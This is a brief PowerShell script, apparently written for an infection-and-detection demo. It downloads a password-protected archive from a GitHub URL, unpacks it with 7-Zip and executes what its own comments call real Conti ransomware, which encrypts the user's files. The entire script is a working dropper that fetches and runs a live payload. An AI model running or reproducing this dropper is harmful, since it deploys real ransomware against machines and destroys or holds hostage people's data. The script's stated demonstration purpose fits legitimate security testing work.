# part of demo to infect and discover
# downloads from Github to user Downloads folder, unpacks w. passwd and executes
# WARNING, uses real ransomware (Conti) to encrypt files
$downloadPath = "$env:USERPROFILE\Downloads"
$zipFilePath = "$downloadPath\conti-temp.zip"
$exeFile = "conti-ebeca2df24a.exe"
$outExePath = "$downloadPath\$exeFile"
$url = "https://github.com/turvas/ps_test/raw/master/conti-ebeca2df24a.zip"
Invoke-WebRequest -Uri $url -OutFile $zipFilePath
& 'C:\Program Files\7-Zip\7z.exe' x $zipFilePath $exeFile -o"$downloadPath" -pDanger
$outExePath
 

